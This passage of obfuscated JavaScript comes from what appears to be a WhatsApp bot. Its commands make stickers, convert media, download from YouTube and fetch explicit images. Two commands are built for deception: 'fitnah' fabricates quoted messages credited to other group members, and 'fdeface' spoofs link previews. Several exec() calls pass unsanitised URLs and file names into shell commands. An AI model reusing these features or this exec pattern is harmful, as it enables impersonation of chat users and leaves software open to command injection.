prefix+'kiss':ranp=getRandom(_0x271569(0x470)),rano=getRandom(_0x271569(0x33b)),_0x2d949b=await axios[_0x271569(0x209)](_0x271569(0x434)),exec(_0x271569(0x20d)+_0x2d949b[_0x271569(0x1a4)][_0x271569(0x2eb)]+_0x271569(0x3c1)+ranp+_0x271569(0x3e3)+ranp+_0x271569(0x347)+rano,_0x137d39=>{const _0x3825bd=_0x271569;fs['unlinkSync'](ranp);if(_0x137d39)return _0x54c827(_0x3825bd(0x309));buffer=fs[_0x3825bd(0x2d2)](rano),_0x138c14[_0x3825bd(0x28d)](_0x282d63,buffer,MessageType[_0x3825bd(0x1a5)],{'quoted':_0x15b2ca}),fs[_0x3825bd(0x3f7)](rano);});break;case prefix+_0x271569(0x2fb):ketaz=await axios['get']('https://nekos.life/api/v2/img/keta'),bufketa=await getBuffer(ketaz[_0x271569(0x1a4)][_0x271569(0x2eb)]),_0x138c14['sendMessage'](_0x282d63,bufketa,_0x5ebec8,{'quoted':_0x15b2ca})['catch'](_0x3344cc=>{const _0x563e3d=_0x271569;return _0x563e3d(0x398);});break;case prefix+_0x271569(0x345):ranp=getRandom(_0x271569(0x470)),rano=getRandom('.webp'),_0x2d949b=await axios[_0x271569(0x209)](_0x271569(0x2f2)),exec(_0x271569(0x20d)+_0x2d949b['data'][_0x271569(0x2eb)]+_0x271569(0x3c1)+ranp+_0x271569(0x3e3)+ranp+_0x271569(0x347)+rano,_0x23c670=>{const _0x13a4bf=_0x271569;fs[_0x13a4bf(0x3f7)](ranp);if(_0x23c670)return _0x54c827(_0x13a4bf(0x309));buffer=fs[_0x13a4bf(0x2d2)](rano),_0x138c14[_0x13a4bf(0x28d)](_0x282d63,buffer,MessageType[_0x13a4bf(0x1a5)],{'quoted':_0x15b2ca}),fs['unlinkSync'](rano);});break;case prefix+_0x271569(0x1e8):cumjpg=await axios['get']('https://nekos.life/api/v2/img/cum_jpg'),bupjpg=await getBuffer(cumjpg[_0x271569(0x1a4)][_0x271569(0x2eb)]),_0x138c14[_0x271569(0x28d)](_0x282d63,bupjpg,_0x5ebec8,{'quoted':_0x15b2ca})['catch'](_0x2a37b7=>{const _0x339ae6=_0x271569;return _0x339ae6(0x398);});break;case prefix+_0x271569(0x2ed):opai=await axios[_0x271569(0x209)]('https://nekos.life/api/v2/img/tits'),opaiz=await getBuffer(opai['data'][_0x271569(0x2eb)]),_0x138c14[_0x271569(0x28d)](_0x282d63,opaiz,_0x5ebec8,{'quoted':_0x15b2ca})['catch'](_0x22408d=>{return'Error\x207-7..';});break;case prefix+_0x271569(0x38c):holox=await axios[_0x271569(0x209)](_0x271569(0x341)),bufholox=await getBuffer(holox[_0x271569(0x1a4)][_0x271569(0x2eb)]),_0x138c14['sendMessage'](_0x282d63,bufholox,_0x5ebec8,{'quoted':_0x15b2ca})['catch'](_0x2cfa2d=>{return'Error\x207-7..';});break;case prefix+_0x271569(0x1a5):case prefix+'stiker':case prefix+'sg':case prefix+'s':if((_0xd2003&&!_0x15b2ca['message'][_0x271569(0x1bc)]||_0x2c43f4)&&_0x794f7a[_0x271569(0x41c)]==0x0){const _0xf3d1e5=_0x2c43f4?JSON['parse'](JSON[_0x271569(0x3bd)](_0x15b2ca)[_0x271569(0x1eb)](_0x271569(0x1f8),'m'))[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x397)]:_0x15b2ca,_0x979fc9=await _0x138c14[_0x271569(0x292)](_0xf3d1e5);ran=_0x271569(0x1c6),await ffmpeg('./'+_0x979fc9)[_0x271569(0x2ea)](_0x979fc9)['on'](_0x271569(0x33f),function(_0x47a109){const _0x52d1a9=_0x271569;console['log'](_0x52d1a9(0x2f7)+_0x47a109);})['on'](_0x271569(0x309),function(_0x690ab6){const _0x4a9e6d=_0x271569;console[_0x4a9e6d(0x1d4)]('Error\x20:\x20'+_0x690ab6),fs[_0x4a9e6d(0x3f7)](_0x979fc9),_0x54c827('error');})['on'](_0x271569(0x3c3),function(){const _0x49230e=_0x271569;console[_0x49230e(0x1d4)](_0x49230e(0x38f)),_0x138c14[_0x49230e(0x28d)](_0x282d63,fs[_0x49230e(0x2d2)](ran),MessageType[_0x49230e(0x1a5)],{'quoted':_0x15b2ca}),fs[_0x49230e(0x3f7)](_0x979fc9),fs[_0x49230e(0x3f7)](ran);})[_0x271569(0x1f6)](['-vcodec',_0x271569(0x1f3),_0x271569(0x257),_0x271569(0x464)])[_0x271569(0x29e)]('webp')[_0x271569(0x2ae)](ran);}else{if((_0xd2003&&_0x15b2ca[_0x271569(0x352)]['videoMessage']['seconds']<0xb||_0x5e0b01&&_0x15b2ca[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x397)]['quotedMessage'][_0x271569(0x1bc)][_0x271569(0x1aa)]<0xb)&&_0x794f7a['length']==0x0){const _0x1cca26=_0x5e0b01?JSON[_0x271569(0x290)](JSON[_0x271569(0x3bd)](_0x15b2ca)['replace'](_0x271569(0x1f8),'m'))[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x397)]:_0x15b2ca,_0x24fb53=await _0x138c14[_0x271569(0x292)](_0x1cca26);ran='999.webp',_0x54c827(mess[_0x271569(0x28e)]),await ffmpeg('./'+_0x24fb53)[_0x271569(0x443)](_0x24fb53[_0x271569(0x2a7)]('.')[0x1])['on'](_0x271569(0x33f),function(_0x142217){const _0x115cb9=_0x271569;console[_0x115cb9(0x1d4)]('Started\x20:\x20'+_0x142217);})['on'](_0x271569(0x309),function(_0x5d9b51){const _0x2ffdc8=_0x271569;console[_0x2ffdc8(0x1d4)](_0x2ffdc8(0x353)+_0x5d9b51),fs[_0x2ffdc8(0x3f7)](_0x24fb53),tipe=_0x24fb53[_0x2ffdc8(0x362)](_0x2ffdc8(0x35a))?_0x2ffdc8(0x3cd):_0x2ffdc8(0x3f4),_0x54c827(_0x2ffdc8(0x1a2)+tipe+_0x2ffdc8(0x1a0));})['on']('end',function(){const _0x506d71=_0x271569;console['log'](_0x506d71(0x38f)),_0x138c14[_0x506d71(0x28d)](_0x282d63,fs['readFileSync'](ran),MessageType[_0x506d71(0x1a5)],{'quoted':_0x15b2ca}),fs['unlinkSync'](_0x24fb53),fs['unlinkSync'](ran);})['addOutputOptions']([_0x271569(0x3af),_0x271569(0x1f3),'-vf',_0x271569(0x464)])[_0x271569(0x29e)](_0x271569(0x308))['save'](ran);}else _0x54c827(_0x271569(0x25b)+prefix+_0x271569(0x457));}break;case prefix+_0x271569(0x358):case prefix+_0x271569(0x26c):case prefix+_0x271569(0x22e):_0x3048f6=_0x794f7a[_0x271569(0x3ab)]('');var _0x11e0d6=_0x3048f6[_0x271569(0x2a7)]('|')[0x0],_0x2457f8=_0x3048f6[_0x271569(0x2a7)]('|')[0x1];if(_0xd2003&&!_0x15b2ca[_0x271569(0x352)][_0x271569(0x1bc)]||_0x2c43f4){const _0x1e0c2e=_0x2c43f4?JSON[_0x271569(0x290)](JSON[_0x271569(0x3bd)](_0x15b2ca)['replace'](_0x271569(0x1f8),'m'))[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x397)]:_0x15b2ca;media=await _0x138c14['downloadAndSaveMediaMessage'](_0x1e0c2e),await createExif(_0x11e0d6,_0x2457f8),out=getRandom('.webp'),ffmpeg(media)['on'](_0x271569(0x309),_0x5c8db7=>{const _0x34cbd4=_0x271569;console[_0x34cbd4(0x1d4)](_0x5c8db7),_0x138c14[_0x34cbd4(0x28d)](_0x282d63,_0x34cbd4(0x23a),_0x34cbd4(0x222),{'quoted':_0x15b2ca}),fs[_0x34cbd4(0x3f7)](media);})['on'](_0x271569(0x3c3),()=>{const _0x19d8f2=_0x271569;_out=getRandom('.webp'),spawn(_0x19d8f2(0x267),[_0x19d8f2(0x24c),'exif',_0x19d8f2(0x235),out,'-o',_out])['on'](_0x19d8f2(0x2e5),()=>{const _0x3077cc=_0x19d8f2;_0x138c14[_0x3077cc(0x28d)](_0x282d63,fs[_0x3077cc(0x2d2)](_out),_0x3077cc(0x30a),{'quoted':_0x15b2ca}),fs[_0x3077cc(0x3f7)](out),fs[_0x3077cc(0x3f7)](_out),fs[_0x3077cc(0x3f7)](media);});})[_0x271569(0x1f6)]([_0x271569(0x3af),_0x271569(0x1f3),_0x271569(0x257),_0x271569(0x464)])['toFormat']('webp')[_0x271569(0x2ae)](out);}else{if((_0xd2003&&_0x15b2ca['message']['videoMessage'][_0x271569(0x1aa)]<0xb||_0x5e0b01&&_0x15b2ca[_0x271569(0x352)][_0x271569(0x45e)]['contextInfo'][_0x271569(0x19d)][_0x271569(0x1bc)][_0x271569(0x1aa)]<0xb)&&_0x794f7a[_0x271569(0x41c)]==0x0){const _0x83bab5=_0x5e0b01?JSON[_0x271569(0x290)](JSON['stringify'](_0x15b2ca)[_0x271569(0x1eb)](_0x271569(0x1f8),'m'))[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x397)]:_0x15b2ca,_0x17d2b5=await _0x138c14[_0x271569(0x292)](_0x83bab5);_0x3048f6=_0x794f7a[_0x271569(0x3ab)]('');var _0x11e0d6=_0x3048f6[_0x271569(0x2a7)]('|')[0x0],_0x2457f8=_0x3048f6[_0x271569(0x2a7)]('|')[0x1];await createExif(_0x11e0d6,_0x2457f8),out=getRandom(_0x271569(0x33b)),ffmpeg(_0x17d2b5)['on']('error',_0x3a016f=>{const _0x4ed000=_0x271569;console[_0x4ed000(0x1d4)](_0x3a016f),_0x138c14['sendMessage'](_0x282d63,'Ocurrió\x20un\x20error\x20',_0x4ed000(0x388),{'quoted':_0x15b2ca}),fs['unlinkSync'](_0x17d2b5);})['on'](_0x271569(0x3c3),()=>{const _0x33422c=_0x271569;_out=getRandom(_0x33422c(0x33b)),spawn(_0x33422c(0x267),[_0x33422c(0x24c),_0x33422c(0x3e4),_0x33422c(0x235),out,'-o',_out])['on']('exit',()=>{const _0x290690=_0x33422c;_0x138c14[_0x290690(0x28d)](_0x282d63,fs[_0x290690(0x2d2)](_out),'stickerMessage',{'quoted':_0x15b2ca}),fs[_0x290690(0x3f7)](out),fs[_0x290690(0x3f7)](_out),fs[_0x290690(0x3f7)](_0x17d2b5);});})[_0x271569(0x1f6)]([_0x271569(0x3af),_0x271569(0x1f3),'-vf',_0x271569(0x464)])[_0x271569(0x29e)](_0x271569(0x308))[_0x271569(0x2ae)](out);}else _0x54c827('Kirim\x20gambar\x20dengan\x20caption\x20'+prefix+_0x271569(0x39c));}break;case prefix+'take':case prefix+'colong':if(!_0x5e3250)return _0x54c827(_0x271569(0x36a));encmedia=JSON['parse'](JSON[_0x271569(0x3bd)](_0x15b2ca)[_0x271569(0x1eb)](_0x271569(0x1f8),'m'))[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x397)],media=await _0x138c14[_0x271569(0x292)](encmedia),_0x2d949b=_0x794f7a[_0x271569(0x3ab)]('\x20')[_0x271569(0x2a7)]('|'),satu=_0x2d949b[0x0]!==''?_0x2d949b[0x0]:'SELF',dua=typeof _0x2d949b[0x1]!==_0x271569(0x1fd)?_0x2d949b[0x1]:_0x271569(0x370),require(_0x271569(0x359))['createExif'](satu,dua),require(_0x271569(0x359))['modStick'](media,_0x138c14,_0x15b2ca,_0x282d63);break;case prefix+'fdeface':ge=_0x794f7a['join']('');var _0x3048f6=ge[_0x271569(0x2a7)]('|')[0x0],_0x355762=ge[_0x271569(0x2a7)]('|')[0x1],_0x28a1cf=ge['split']('|')[0x2],_0x141835=ge['split']('|')[0x3];const _0x1d6254=_0x271569(0x431)+prefix+'fdeface\x20link|title|desc|teks';if(_0x794f7a[_0x271569(0x41c)]<0x1)return _0x54c827(_0x1d6254);const _0xe5781f=_0x5e3250||_0x2c43f4?JSON[_0x271569(0x290)](JSON[_0x271569(0x3bd)](_0x15b2ca)[_0x271569(0x1eb)](_0x271569(0x1f8),'m'))['message'][_0x271569(0x45e)][_0x271569(0x397)]:_0x15b2ca,_0x295541=await _0x138c14[_0x271569(0x292)](_0xe5781f),_0x3cba08=fs[_0x271569(0x2d2)](_0x295541),_0x502fa0=''+_0x28a1cf,_0x541bfd=''+_0x355762,_0xf7d51c=''+_0x3048f6,_0x586e6e=_0x271569(0x349)+_0x141835;var _0x2d949b={'detectLinks':![]},_0x4a520d=await _0x138c14[_0x271569(0x3fa)](_0xf7d51c);_0x4a520d[_0x271569(0x412)]=_0x541bfd,_0x4a520d[_0x271569(0x1ed)]=_0x502fa0,_0x4a520d[_0x271569(0x1b6)]=_0x3cba08,_0x4a520d[_0x271569(0x1b1)]=_0x586e6e,_0x138c14[_0x271569(0x28d)](_0x282d63,_0x4a520d,MessageType['extendedText'],_0x2d949b);break;case prefix+_0x271569(0x441):if(!_0x10a56f)return _0xbe147b('emoji\x20UnU?');qes=_0x794f7a['join']('\x20'),emoji[_0x271569(0x209)](''+qes)[_0x271569(0x3e5)](_0x9dde5b=>{const _0x403274=_0x271569;teks=''+_0x9dde5b[_0x403274(0x3de)][0x4][_0x403274(0x2eb)],_0x465cf4(_0x282d63,''+teks),console[_0x403274(0x1d4)](teks);})[_0x271569(0x268)](_0x956c94=>{const _0x4eb7e8=_0x271569;_0x54c827(_0x4eb7e8(0x36c));});break;case prefix+_0x271569(0x21e):if(_0x794f7a['length']<0x1)return _0x54c827('Text\x20Nya\x20Mana\x20Ajg?\x0a>\x20*Contoh*\x20:\x20*'+prefix+'attp*\x20_Aku\x20Ganz_');attp2=await getBuffer(_0x271569(0x244)+body[_0x271569(0x225)](0x6)),_0x138c14[_0x271569(0x28d)](_0x282d63,attp2,MessageType[_0x271569(0x1a5)],{'quoted':_0x15b2ca});break;case prefix+_0x271569(0x448):if(!_0x5e3250)return _0x54c827(_0x271569(0x2ad));_0x54c827(mess['wait']),encmedia=JSON['parse'](JSON['stringify'](_0x15b2ca)[_0x271569(0x1eb)](_0x271569(0x1f8),'m'))[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x397)],media=await _0x138c14[_0x271569(0x292)](encmedia),ran=getRandom(_0x271569(0x45c)),exec('ffmpeg\x20-i\x20'+media+'\x20'+ran,_0x46e68d=>{const _0x16cf0b=_0x271569;fs[_0x16cf0b(0x3f7)](media);if(_0x46e68d)return _0x54c827(_0x16cf0b(0x33a));buffer=fs['readFileSync'](ran),_0x22e0d8(buffer,_0x16cf0b(0x278)),fs[_0x16cf0b(0x3f7)](ran);});break;case prefix+_0x271569(0x2fa):case prefix+_0x271569(0x383):(_0xd2003&&!_0x15b2ca[_0x271569(0x352)][_0x271569(0x1bc)]||_0x5e3250)&&_0x794f7a[_0x271569(0x41c)]==0x0?(ger=_0x5e3250?JSON[_0x271569(0x290)](JSON[_0x271569(0x3bd)](_0x15b2ca)[_0x271569(0x1eb)](_0x271569(0x1f8),'m'))[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x397)]:_0x15b2ca,owgi=await _0x138c14[_0x271569(0x292)](ger),webp2mp4File(owgi)[_0x271569(0x3e5)](_0x496eef=>{_0x58a39e(_0x282d63,_0x496eef['result'],'Done');})):_0x54c827('responde\x20stiker');fs['unlinkSync'](owgi);break;case prefix+_0x271569(0x294):if(!_0x5e0b01)return _0xbe147b('Responde\x20video\x20UnU!');_0xbe147b(mess[_0x271569(0x28e)]),encmedia=JSON[_0x271569(0x290)](JSON[_0x271569(0x3bd)](_0x15b2ca)[_0x271569(0x1eb)]('quotedM','m'))[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x397)],media=await _0x138c14['downloadAndSaveMediaMessage'](encmedia),ran=getRandom(_0x271569(0x35a)),exec(_0x271569(0x1ea)+media+'\x20'+ran,_0x3ee688=>{const _0x34d1a0=_0x271569;fs[_0x34d1a0(0x3f7)](media);if(_0x3ee688)return _0xbe147b(_0x34d1a0(0x210)+_0x3ee688);buffer453=fs[_0x34d1a0(0x2d2)](ran),_0x138c14['sendMessage'](_0x282d63,buffer453,_0x41197c,{'mimetype':_0x34d1a0(0x442),'quoted':_0x15b2ca}),fs[_0x34d1a0(0x3f7)](ran);});break;case prefix+_0x271569(0x25c):if(!_0x5e0b01)return _0xbe147b(_0x271569(0x407));_0xbe147b(mess[_0x271569(0x28e)]),encmedia=JSON['parse'](JSON[_0x271569(0x3bd)](_0x15b2ca)[_0x271569(0x1eb)]('quotedM','m'))[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x397)],media=await _0x138c14['downloadAndSaveMediaMessage'](encmedia),ran=getRandom('.mp4'),exec(_0x271569(0x1ea)+media+_0x271569(0x300)+ran,_0x496454=>{const _0xaafed6=_0x271569;fs[_0xaafed6(0x3f7)](media);if(_0x496454)return _0xbe147b('Err:\x20'+_0x496454);buffer453=fs[_0xaafed6(0x2d2)](ran),_0x138c14['sendMessage'](_0x282d63,buffer453,_0x356628,{'mimetype':_0xaafed6(0x411),'quoted':_0x15b2ca}),fs[_0xaafed6(0x3f7)](ran);});break;case prefix+_0x271569(0x2e2):if(!_0x5e0b01)return _0xbe147b(_0x271569(0x34a));_0xbe147b(mess[_0x271569(0x28e)]),encmedia=JSON[_0x271569(0x290)](JSON[_0x271569(0x3bd)](_0x15b2ca)[_0x271569(0x1eb)](_0x271569(0x1f8),'m'))[_0x271569(0x352)][_0x271569(0x45e)]['contextInfo'],media=await _0x138c14[_0x271569(0x292)](encmedia),ran=getRandom(_0x271569(0x35a)),exec(_0x271569(0x1ea)+media+_0x271569(0x3e0)+ran,_0x361d86=>{const _0x255378=_0x271569;fs[_0x255378(0x3f7)](media);if(_0x361d86)return _0xbe147b('Err:\x20'+_0x361d86);buffer453=fs[_0x255378(0x2d2)](ran),_0x138c14[_0x255378(0x28d)](_0x282d63,buffer453,_0x356628,{'mimetype':_0x255378(0x411),'quoted':_0x15b2ca}),fs[_0x255378(0x3f7)](ran);});break;case prefix+_0x271569(0x29b):if(!_0x5e0b01)return _0xbe147b(_0x271569(0x22c));encmedia=JSON[_0x271569(0x290)](JSON[_0x271569(0x3bd)](_0x15b2ca)[_0x271569(0x1eb)](_0x271569(0x1f8),'m'))[_0x271569(0x352)]['extendedTextMessage'][_0x271569(0x397)],media=await _0x138c14[_0x271569(0x292)](encmedia),ran=getRandom(_0x271569(0x35a)),exec('ffmpeg\x20-i\x20'+media+_0x271569(0x40d)+ran,_0x5821a3=>{const _0x2b507b=_0x271569;fs[_0x2b507b(0x3f7)](media);if(_0x5821a3)return _0xbe147b(_0x2b507b(0x210)+_0x5821a3);buffer453=fs[_0x2b507b(0x2d2)](ran),_0x138c14[_0x2b507b(0x28d)](_0x282d63,buffer453,_0x356628,{'mimetype':_0x2b507b(0x411),'quoted':_0x15b2ca}),fs[_0x2b507b(0x3f7)](ran);});break;case prefix+_0x271569(0x375):(_0xd2003&&!_0x15b2ca[_0x271569(0x352)][_0x271569(0x1bc)]||_0x2c43f4||_0x5e0b01)&&_0x794f7a[_0x271569(0x41c)]==0x0?(boij=_0x2c43f4||_0x5e0b01?JSON[_0x271569(0x290)](JSON[_0x271569(0x3bd)](_0x15b2ca)[_0x271569(0x1eb)](_0x271569(0x1f8),'m'))[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x397)]:_0x15b2ca,owgi=await _0x138c14[_0x271569(0x39e)](boij),_0x2a1ef9=await upload(owgi),_0x54c827(_0x2a1ef9)):_0x54c827(_0x271569(0x1fe));break;case prefix+_0x271569(0x32d):if(!_0x10a56f)return _0x6bdcc6(_0x271569(0x40e));_0x138c14[_0x271569(0x28d)](_0x271569(0x43d),''+_0x10a56f,_0x9ad073),_0xbe147b(_0x271569(0x3fb)+_0x10a56f);break;case prefix+_0x271569(0x425):if(_0x2c43f4){const _0x37dbf6=_0x2c43f4?JSON[_0x271569(0x290)](JSON[_0x271569(0x3bd)](_0x15b2ca)[_0x271569(0x1eb)](_0x271569(0x1f8),'m'))[_0x271569(0x352)]['extendedTextMessage'][_0x271569(0x397)]:_0x15b2ca;cihcih=await _0x138c14['downloadMediaMessage'](_0x37dbf6),_0x138c14['sendMessage'](_0x271569(0x43d),cihcih,_0x5ebec8,{'caption':''+_0x10a56f}),bur=_0x271569(0x302)+_0x10a56f,_0x138c14['sendMessage'](_0x282d63,bur,_0xfa1a73,{'quoted':_0x15b2ca});}else _0x6bdcc6('Responder\x20imagen!');break;case prefix+'upswvideo':if(_0x5e0b01){const _0x1d1860=_0x5e0b01?JSON[_0x271569(0x290)](JSON['stringify'](_0x15b2ca)[_0x271569(0x1eb)](_0x271569(0x1f8),'m'))[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x397)]:_0x15b2ca;cihcih=await _0x138c14[_0x271569(0x39e)](_0x1d1860),_0x138c14[_0x271569(0x28d)](_0x271569(0x43d),cihcih,_0x356628,{'caption':''+_0x10a56f}),bur=_0x271569(0x427)+_0x10a56f,_0x138c14[_0x271569(0x28d)](_0x282d63,bur,_0xfa1a73,{'quoted':_0x15b2ca});}else _0x6bdcc6(_0x271569(0x1dd));break;case prefix+'fitnah':if(_0x794f7a[_0x271569(0x41c)]<0x1)return _0x54c827(_0x271569(0x2d0)+prefix+_0x271569(0x3ac)+prefix+_0x271569(0x1cf));var _0x18e68d=_0x794f7a[_0x271569(0x3ab)]('\x20');mentioned=_0x15b2ca[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x397)][_0x271569(0x458)];var _0x2d96ed=_0x18e68d[_0x271569(0x2a7)]('|')[0x0],_0x38e871=_0x18e68d[_0x271569(0x2a7)]('|')[0x1],_0x5161ca=_0x18e68d[_0x271569(0x2a7)]('|')[0x2];_0x138c14['sendMessage'](_0x282d63,''+_0x5161ca,_0xfa1a73,{'quoted':{'key':{'fromMe':![],'participant':''+mentioned,..._0x282d63?{'remoteJid':_0x282d63}:{}},'message':{'conversation':''+_0x38e871}}});break;case prefix+_0x271569(0x365):await herolist()[_0x271569(0x3e5)](_0x11f08f=>{const _0x4c9a64=_0x271569;let _0x521a43=_0x4c9a64(0x437)+prefix+_0x4c9a64(0x26a);for(var _0x5e9fb1=0x0;_0x5e9fb1<_0x11f08f[_0x4c9a64(0x379)]['length'];_0x5e9fb1++){_0x521a43+='-\x20\x20'+_0x11f08f['hero'][_0x5e9fb1]+'\x0a';}_0x29151e(_0x521a43);});break;case prefix+_0x271569(0x3d8):_0x2a1ef9=await herodetails(body[_0x271569(0x225)](0xc)),her=_0x271569(0x36b)+body[_0x271569(0x225)](0xc)+_0x271569(0x2e9)+_0x2a1ef9[_0x271569(0x313)]+'\x0a*Role*\x20:\x20'+_0x2a1ef9[_0x271569(0x197)]+_0x271569(0x3d3)+_0x2a1ef9[_0x271569(0x202)]+_0x271569(0x3a8)+_0x2a1ef9['hero_feature']+'\x0a*Spesial*\x20:\x20'+_0x2a1ef9['speciality']+'\x0a*Rekomendasi\x20Lane*\x20:\x20'+_0x2a1ef9[_0x271569(0x277)]+'\x0a*Harga*\x20:\x20'+_0x2a1ef9[_0x271569(0x295)][_0x271569(0x19e)]+_0x271569(0x1a9)+_0x2a1ef9[_0x271569(0x295)][_0x271569(0x3b1)]+_0x271569(0x382)+_0x2a1ef9[_0x271569(0x295)][_0x271569(0x32f)]+_0x271569(0x35d)+_0x2a1ef9[_0x271569(0x25f)]+_0x271569(0x239)+_0x2a1ef9[_0x271569(0x408)]['durability']+_0x271569(0x207)+_0x2a1ef9['skill'][_0x271569(0x20e)]+_0x271569(0x419)+_0x2a1ef9[_0x271569(0x44b)]+'\x0a*Difficulty*\x20:\x20'+_0x2a1ef9[_0x271569(0x408)][_0x271569(0x276)]+'\x0a\x20\x0a*Movement\x20Speed*\x20:\x20'+_0x2a1ef9[_0x271569(0x2a5)][_0x271569(0x29d)]+'\x0a*Physical\x20Attack*\x20:\x20'+_0x2a1ef9[_0x271569(0x2a5)][_0x271569(0x405)]+_0x271569(0x221)+_0x2a1ef9['attributes']['magic_defense']+_0x271569(0x2e7)+_0x2a1ef9[_0x271569(0x2a5)][_0x271569(0x465)]+_0x271569(0x1b2)+_0x2a1ef9[_0x271569(0x2a5)]['hp']+_0x271569(0x334)+_0x2a1ef9['attributes'][_0x271569(0x2b0)]+_0x271569(0x462)+_0x2a1ef9['attributes'][_0x271569(0x452)]+_0x271569(0x29f)+_0x2a1ef9['background_story']+'\x0a',_0x29151e(her);break;case prefix+_0x271569(0x39b):if(_0x794f7a[_0x271569(0x41c)]===0x0)return _0x54c827(_0x271569(0x24f)+prefix+_0x271569(0x20c));var _0x16502c=_0x794f7a['join']('');_0x3f44f3=await yts(_0x16502c),aramat=_0x3f44f3['all'];var _0x344e43=aramat[0x0]['url'];try{yta(_0x344e43)[_0x271569(0x3e5)](_0x4a3ac3=>{const _0x272a41=_0x271569,{dl_link:_0x2ba2ff,thumb:_0x1bbadc,title:_0x51caf8,filesizeF:_0x3c32db,filesize:_0x5752b7}=_0x4a3ac3;axios['get']('https://tinyurl.com/api-create.php?url='+_0x2ba2ff)[_0x272a41(0x3e5)](async _0x490018=>{const _0x50e9f2=_0x272a41;if(Number(_0x5752b7)>=0x186a0)return _0x58a39e(_0x282d63,_0x1bbadc,_0x50e9f2(0x436)+_0x51caf8+'\x0a*Ext*\x20:\x20MP3\x0a*Filesize*\x20:\x20'+_0x3c32db+'\x0a*Link*\x20:\x20'+_0x490018[_0x50e9f2(0x1a4)]+'\x0a\x0a_Untuk\x20durasi\x20lebih\x20dari\x20batas\x20disajikan\x20dalam\x20mektuk\x20link_');const _0x412ea1=_0x50e9f2(0x436)+_0x51caf8+_0x50e9f2(0x430)+_0x3c32db+'\x0a*Link*\x20:\x20'+_0x490018[_0x50e9f2(0x1a4)]+_0x50e9f2(0x3ee);_0x58a39e(_0x282d63,_0x1bbadc,_0x412ea1),await _0x58a39e(_0x282d63,_0x2ba2ff)[_0x50e9f2(0x268)](()=>_0x54c827(_0x50e9f2(0x309)));});});}catch(_0x2b0810){_0x54c827(mess[_0x271569(0x309)][_0x271569(0x3a7)]);}break;case prefix+_0x271569(0x3cd):if(_0x794f7a[_0x271569(0x41c)]===0x0)return _0x54c827('Kirim\x20perintah\x20*'+prefix+_0x271569(0x2fd));var _0x16502c=_0x794f7a['join']('');_0x3f44f3=await yts(_0x16502c),aramat=_0x3f44f3[_0x271569(0x224)];var _0x344e43=aramat[0x0][_0x271569(0x2eb)];try{ytv(_0x344e43)[_0x271569(0x3e5)](_0x1ceab9=>{const _0x460625=_0x271569,{dl_link:_0x56bff6,thumb:_0x6d9209,title:_0x1b9c0e,filesizeF:_0x5247e1,filesize:_0x2ee658}=_0x1ceab9;axios[_0x460625(0x209)](_0x460625(0x420)+_0x56bff6)[_0x460625(0x3e5)](async _0x39a567=>{const _0x5bcf5b=_0x460625;if(Number(_0x2ee658)>=0x186a0)return _0x58a39e(_0x282d63,_0x6d9209,_0x5bcf5b(0x288)+_0x1b9c0e+_0x5bcf5b(0x2f3)+_0x5247e1+_0x5bcf5b(0x329)+_0x39a567[_0x5bcf5b(0x1a4)]+_0x5bcf5b(0x3aa));const _0x2dab45='*PLAY\x20VIDEO*\x0a\x0a*Title*\x20:\x20'+_0x1b9c0e+_0x5bcf5b(0x2c3)+_0x5247e1+'\x0a*Link*\x20:\x20'+_0x39a567[_0x5bcf5b(0x1a4)]+_0x5bcf5b(0x3ee);_0x58a39e(_0x282d63,_0x6d9209,_0x2dab45),await _0x58a39e(_0x282d63,_0x56bff6)[_0x5bcf5b(0x268)](()=>_0x54c827(_0x5bcf5b(0x309)));});});}catch(_0x44fa04){_0x54c827(mess['error']['api']);}break;case prefix+_0x271569(0x433):if(_0x794f7a[_0x271569(0x41c)]===0x0)return _0x54c827(_0x271569(0x2d4)+prefix+_0x271569(0x32e));let _0x4f93d3=_0x794f7a[0x0][_0x271569(0x252)](/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/);if(!_0x4f93d3)return _0x54c827(mess['error']['Iv']);try{_0x54c827(mess[_0x271569(0x28e)]),yta(_0x794f7a[0x0])[_0x271569(0x3e5)](_0x1ce715=>{const _0xdb7f1a=_0x271569,{dl_link:_0x24747c,thumb:_0x435bac,title:_0x25096c,filesizeF:_0x48b28e,filesize:_0x2d1e33}=_0x1ce715;axios[_0xdb7f1a(0x209)]('https://tinyurl.com/api-create.php?url='+_0x24747c)[_0xdb7f1a(0x3e5)](_0x2d0bd2=>{const _0x510c0a=_0xdb7f1a;if(Number(_0x2d1e33)>=0x7530)return _0x58a39e(_0x282d63,_0x435bac,'*Datos\x20obtenidos\x20con\x20éxito!*\x0a\x0a*Titulo*\x20:\x20'+_0x25096c+_0x510c0a(0x2f3)+_0x48b28e+'\x0a*Link*\x20:\x20'+_0x2d0bd2[_0x510c0a(0x1a4)]+_0x510c0a(0x2b1));const _0x167feb='*YTMP3*\x0a\x0a*Title*\x20:\x20'+_0x25096c+_0x510c0a(0x430)+_0x48b28e+_0x510c0a(0x3e6);_0x58a39e(_0x282d63,_0x435bac,_0x167feb),_0x58a39e(_0x282d63,_0x24747c)[_0x510c0a(0x268)](()=>_0x54c827(mess[_0x510c0a(0x309)][_0x510c0a(0x3a7)]));});});}catch(_0x131f90){_0x54c827(mess[_0x271569(0x309)][_0x271569(0x3a7)]);}break;case prefix+_0x271569(0x40f):if(_0x794f7a['length']===0x0)return _0x54c827('Enviar\x20*'+prefix+_0x271569(0x33d));let _0x23b006=_0x794f7a[0x0][_0x271569(0x252)](/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/);if(!_0x23b006)return _0x54c827(mess[_0x271569(0x309)]['Iv']);try{_0x54c827(mess[_0x271569(0x28e)]),ytv(_0x794f7a[0x0])[_0x271569(0x3e5)](_0x658f20=>{const 